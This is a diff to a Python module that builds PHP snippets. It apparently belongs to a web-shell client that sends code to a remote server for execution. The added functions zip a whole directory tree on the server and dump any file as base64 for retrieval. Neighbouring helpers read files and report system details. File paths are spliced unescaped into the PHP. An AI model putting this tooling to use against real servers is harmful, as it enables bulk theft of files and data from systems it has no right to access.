@@ -56,6 +56,52 @@ def file_get_contents(dirx):
     return f"""echo file_get_contents('{dirx}');"""
 
 #
+def zip_path(path="./"):
+    php_zip_code="""// Get real path for our folder
+$rootPath = realpath('"""+path+"""');
+
+$hash=date("ymdHis");
+
+// Initialize archive object
+$zip = new ZipArchive();
+$zip->open($hash.'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
+
+// Create recursive directory iterator
+/** @var SplFileInfo[] $files */
+$files = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator($rootPath),
+    RecursiveIteratorIterator::LEAVES_ONLY
+);
+
+foreach ($files as $name => $file)
+{
+    // Skip directories (they would be added automatically)
+    if (!$file->isDir())
+    {
+        // Get real and relative path for current file
+        $filePath = $file->getRealPath();
+        $relativePath = substr($filePath, strlen($rootPath) + 1);
+
+        // Add current file to archive
+        $zip->addFile($filePath, $relativePath);
+    }
+}
+
+// Zip archive will be created only after closing object
+$zip->close();
+echo $hash.".zip";"""
+    return php_zip_code
+
+#
+def file_to_b64(path):
+    code="""
+$file='"""+path+"""';
+$fp = fopen($file, "rb");
+$binary = fread($fp, filesize($file));
+echo base64_encode($binary);"""
+    return code
+
+#
 def php_info():
     code="""header('Content-type: text/plain');
     echo "OS : ".php_uname();
